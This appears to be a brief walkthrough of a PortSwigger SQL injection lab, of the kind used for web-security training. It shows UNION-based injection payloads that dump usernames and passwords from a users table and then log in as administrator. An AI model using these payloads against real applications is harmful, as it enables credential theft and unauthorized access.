## Lab Description:

<img width="867" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/c02e809a-b2f4-4d76-ba8c-8a625e71a3c5">

## Solution:

The database contains a different table called users, with columns called username and password.

```SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' --```

both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.

```SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users --```

<img width="1282" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/8448c8c6-a653-4282-a909-614a474d8fa3">

<img width="1195" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/33ce918c-a08c-40ee-abce-3594dcd74cc7">

<img width="1196" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/889eaa33-8692-4d58-9afb-3ce25a238b17">


Now, We have the credentials of username and password and with that we can access it as administrator.

<img width="1197" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/d4499e77-0d82-43b0-96b6-59c97e41cc5a">




